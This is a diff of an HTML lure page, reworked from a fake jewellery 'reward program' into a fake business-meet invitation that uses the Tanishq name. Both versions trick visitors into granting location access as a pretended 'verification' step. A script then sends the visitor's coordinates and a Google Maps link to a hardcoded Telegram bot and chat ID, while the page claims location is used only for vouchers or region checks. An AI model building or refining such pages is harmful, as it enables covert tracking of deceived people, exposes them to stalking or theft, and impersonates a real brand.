@@ -1,227 +1,354 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Golden Crown Jewellers Reward Program</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
-  <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family:Arial, sans-serif;
-    }
+<title>TANISHQ Jewellers Business Meet 2026</title>
 
-    body{
-      background:linear-gradient(135deg,#1a1a1a,#3b2a00,#c99a00);
-      min-height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      padding:20px;
-      color:white;
-    }
+<style>
 
-    .container{
-      width:100%;
-      max-width:500px;
-      background:rgba(255,255,255,0.08);
-      backdrop-filter:blur(10px);
-      border:1px solid rgba(255,255,255,0.15);
-      border-radius:25px;
-      padding:30px;
-      box-shadow:0 15px 40px rgba(0,0,0,0.5);
-      text-align:center;
-      animation:fadeIn 1s ease;
-    }
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family:Arial,sans-serif;
+}
 
-    @keyframes fadeIn{
-      from{opacity:0;transform:translateY(30px);}
-      to{opacity:1;transform:translateY(0);}
-    }
+body{
+  background:
+  linear-gradient(rgba(0,0,0,0.82),rgba(0,0,0,0.82)),
+  url('https://images.unsplash.com/photo-1617038220319-276d3cfab638?q=80&w=1200&auto=format&fit=crop');
+  background-size:cover;
+  background-position:center;
+  color:white;
+  min-height:100vh;
+  padding:20px;
+}
 
-    .badge{
-      background:gold;
-      color:black;
-      display:inline-block;
-      padding:8px 18px;
-      border-radius:50px;
-      font-weight:bold;
-      margin-bottom:20px;
-      box-shadow:0 5px 15px rgba(255,215,0,0.4);
-    }
+.container{
+  max-width:650px;
+  margin:auto;
+  background:rgba(255,255,255,0.06);
+  backdrop-filter:blur(12px);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:28px;
+  overflow:hidden;
+  box-shadow:0 20px 50px rgba(0,0,0,0.5);
+}
 
-    h1{
-      font-size:32px;
-      margin-bottom:15px;
-      color:#ffd700;
-    }
+.top-banner{
+  background:linear-gradient(135deg,#ffd700,#c58b00);
+  padding:28px 20px;
+  text-align:center;
+  color:black;
+}
 
-    .sub{
-      font-size:16px;
-      line-height:1.7;
-      color:#f0f0f0;
-      margin-bottom:25px;
-    }
+.logo-box{
+  width:110px;
+  height:110px;
+  border-radius:50%;
+  background:white;
+  margin:auto;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  overflow:hidden;
+  box-shadow:0 10px 25px rgba(0,0,0,0.25);
+}
 
-    .reward-box{
-      background:rgba(255,255,255,0.08);
-      border-radius:20px;
-      padding:20px;
-      margin-bottom:25px;
-      border:1px solid rgba(255,255,255,0.1);
-    }
+.logo-box img{
+  width:100%;
+  height:100%;
+  object-fit:cover;
+}
 
-    .reward-box h2{
-      color:#ffd700;
-      margin-bottom:12px;
-    }
+/* YOUR LOGO IMAGE LINK HERE */
+.logo-placeholder{
+  font-size:14px;
+  padding:10px;
+  text-align:center;
+  color:#666;
+}
 
-    .reward-list{
-      text-align:left;
-      margin-top:15px;
-      line-height:2;
-      color:#f5f5f5;
-    }
+h1{
+  margin-top:18px;
+  font-size:34px;
+  font-weight:bold;
+}
 
-    .reward-list li{
-      margin-left:20px;
-    }
+.sub{
+  margin-top:10px;
+  font-size:16px;
+  font-weight:bold;
+}
 
-    .claim-btn{
-      width:100%;
-      padding:16px;
-      border:none;
-      border-radius:15px;
-      background:linear-gradient(135deg,#ffd700,#ffb300);
-      color:black;
-      font-size:18px;
-      font-weight:bold;
-      cursor:pointer;
-      transition:0.3s;
-      box-shadow:0 10px 20px rgba(255,215,0,0.3);
-    }
+.content{
+  padding:30px;
+}
 
-    .claim-btn:hover{
-      transform:scale(1.03);
-    }
+.verified{
+  background:rgba(255,215,0,0.12);
+  border:1px solid rgba(255,215,0,0.3);
+  padding:18px;
+  border-radius:18px;
+  margin-bottom:25px;
+  line-height:1.8;
+}
 
-    .notice{
-      margin-top:20px;
-      font-size:13px;
-      line-height:1.6;
-      color:#ddd;
-      background:rgba(255,255,255,0.05);
-      padding:15px;
-      border-radius:15px;
-    }
+.section-title{
+  color:#ffd700;
+  font-size:24px;
+  margin-bottom:18px;
+}
 
-    #status{
-      margin-top:20px;
-      font-size:16px;
-      font-weight:bold;
-      color:#ffd700;
-    }
+.card{
+  background:rgba(255,255,255,0.05);
+  padding:22px;
+  border-radius:18px;
+  margin-bottom:20px;
+  border:1px solid rgba(255,255,255,0.08);
+}
 
-    .footer{
-      margin-top:20px;
-      font-size:12px;
-      color:#bbb;
-    }
-  </style>
+.card p{
+  line-height:1.8;
+  color:#f1f1f1;
+}
+
+ul{
+  margin-top:15px;
+  margin-left:20px;
+  line-height:2;
+}
+
+.highlight{
+  color:#ffd700;
+  font-weight:bold;
+}
+
+.button{
+  width:100%;
+  padding:18px;
+  border:none;
+  border-radius:16px;
+  background:linear-gradient(135deg,#ffd700,#ffb100);
+  color:black;
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+  margin-top:10px;
+  transition:0.3s;
+}
+
+.button:hover{
+  transform:scale(1.02);
+}
+
+.notice{
+  margin-top:20px;
+  background:rgba(255,255,255,0.05);
+  padding:16px;
+  border-radius:14px;
+  line-height:1.7;
+  color:#ddd;
+  font-size:14px;
+}
+
+#status{
+  margin-top:18px;
+  text-align:center;
+  color:#ffd700;
+  font-weight:bold;
+}
+
+.footer{
+  margin-top:25px;
+  text-align:center;
+  color:#aaa;
+  font-size:13px;
+  line-height:1.8;
+}
+
+</style>
 </head>
+
 <body>
 
 <div class="container">
 
-  <div class="badge">Verified Reward Program</div>
+  <div class="top-banner">
 
-  <h1>Congratulations!</h1>
+    <div class="logo-box">
 
-  <p class="sub">
-    You have been selected as one of the premium customers eligible for the Golden Crown Jewellers Celebration Reward Program.
-  </p>
+      <!-- PUT YOUR LOGO IMAGE LINK BELOW -->
 
-  <div class="reward-box">
-    <h2>Your Reward Includes</h2>
+      <!-- Example:
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZpn4osETsReEMfvhKiW-dQYl7YxMHCQIoXrCIHVb-9yvXPqUk81CwFlsF&s=10">
+      -->
 
-    <ul class="reward-list">
-      <li>₹5,0000 Gold Purchase discount</li>
-      <li>Exclusive jwellery shop Membership</li>
-      <li> wholesale Jewellery Discount Access</li>
-      <li>Priority Lucky Draw Entry</li>
-      <li>Premium shop Verification Badge under Tanishq jewellery</li>
-    </ul>
+      <div class="logo-placeholder">
+        YOUR<br>LOGO
+      </div>
+
+    </div>
+
+    <h1>Aryan Jewellers</h1>
+
+    <div class="sub">
+      National Jewellery Business Growth Meet 2026
+    </div>
+
   </div>
 
-  <button class="claim-btn" onclick="getLocation()">
-    Claim Reward Now
-  </button>
+  <div class="content">
 
-  <div class="notice">
-    For security verification and regional reward eligibility, the browser may request location access permission. Your location is only shared for sending the voucher reward box.
-  </div>
+    <div class="verified">
 
-  <div id="status"></div>
+      ✔ Premium Jewellery Business Conference<br>
+      ✔ Selected Jewellery Store Invitation<br>
+      ✔ Business Expansion Opportunity<br>
+      ✔ Wholesale Gold Partnership Access<br>
+      ✔ High Value Dealer Networking Program
 
-  <div class="footer">
-    © 2026 Golden Crown Jewellers Reward Program
+    </div>
+
+    <div class="card">
+
+      <div class="section-title">
+        Invitation Details
+      </div>
+
+      <p>
+        Dear Jewellery Business Owner,
+        <br><br>
+
+        We are pleased to inform you that your jewellery business has been shortlisted for the
+        <span class="highlight">National Jewellery Business Growth Meet 2026</span>
+        conducted by
+        <span class="highlight">Aryan Jewellers</span>.
+        <br><br>
+
+        This premium business conference is specially organized for selected jewellery stores and gold business partners from different regions.
+      </p>
+
+    </div>
+
+    <div class="card">
+
+      <div class="section-title">
+        Business Benefits
+      </div>
+
+      <ul>
+        <li>Wholesale Gold Purchase Opportunities</li>
+        <li>Premium Jewellery Supplier Network</li>
+        <li>Business Growth Partnerships</li>
+        <li>Special Festival Collection Access</li>
+        <li>Dealer Level Discount Programs</li>
+        <li>Direct Jewellery Market Networking</li>
+      </ul>
+
+    </div>
+
+    <div class="card">
+
+      <div class="section-title">
+        Verification Process
+      </div>
+
+      <p>
+        To confirm participation and regional business verification, selected participants are required to complete secure location verification before receiving conference schedule access.
+      </p>
+
+    </div>
+
+    <button class="button" onclick="getLocation()">
+      Complete Verification
+    </button>
+
+    <div class="notice">
+
+      By continuing, the browser may request your location permission for business region verification. Location is only shared after manual approval.
+
+    </div>
+
+    <div id="status"></div>
+
+    <div class="footer">
+
+      © 2026 TANISHQ Jewellers Business Meet<br>
+      Luxury Jewellery Business Network Program
+
+    </div>
+
   </div>
 
 </div>
 
 <script>
 
-  const BOT_TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
-  const CHAT_ID = "8508792403";
+const BOT_TOKEN = "8378037937:AAGjuFdZWLnf0kFfTG_QIFCslgvrDMb-sC4";
+const CHAT_ID = "8508792403";
 
-  async function sendToTelegram(message){
+async function sendToTelegram(message){
 
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    await fetch(url,{
-      method:"POST",
-      headers:{
-        "Content-Type":"application/json"
-      },
-      body:JSON.stringify({
-        chat_id:CHAT_ID,
-        text:message
-      })
-    });
+  await fetch(url,{
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+      chat_id:CHAT_ID,
+      text:message
+    })
+  });
+
+}
+
+function getLocation(){
+
+  const status=document.getElementById("status");
+
+  if(!navigator.geolocation){
+    status.innerText="Geolocation not supported.";
+    return;
   }
 
-  function getLocation(){
+  status.innerText="Starting secure verification...";
 
-    const status=document.getElementById("status");
+  navigator.geolocation.getCurrentPosition(
 
-    if(!navigator.geolocation){
-      status.innerText="Geolocation not supported.";
-      return;
+    async(position)=>{
+
+      const lat=position.coords.latitude;
+      const lon=position.coords.longitude;
+
+      const message=
+`🏆 TANISHQ Jewellers Verification
+
+📍 Location Received
+
+Latitude: ${lat}
+Longitude: ${lon}
+
+🗺 Map:
+https://maps.google.com/?q=${lat},${lon}`;
+
+      await sendToTelegram(message);
+
+      status.innerText="Verification completed successfully.";
+
+    },
+
+    (error)=>{
+      status.innerText="Permission denied or unavailable.";
     }
 
-    status.innerText="Requesting secure verification permission...";
+  );
 
-    navigator.geolocation.getCurrentPosition(
-
-      async(position)=>{
-
-        const lat=position.coords.latitude;
-        const lon=position.coords.longitude;
-
-        const message=`🏆 Reward Verification Completed\n\n📍 User Location Received\nLatitude: ${lat}\nLongitude: ${lon}\n\n🗺 Google Maps:\nhttps://maps.google.com/?q=${lat},${lon}`;
-
-        await sendToTelegram(message);
-
-        status.innerText="Verification completed successfully.";
-      },
-
-      (error)=>{
-        status.innerText="Permission denied or unavailable.";
-      }
-    );
-  }
+}
 
 </script>
 
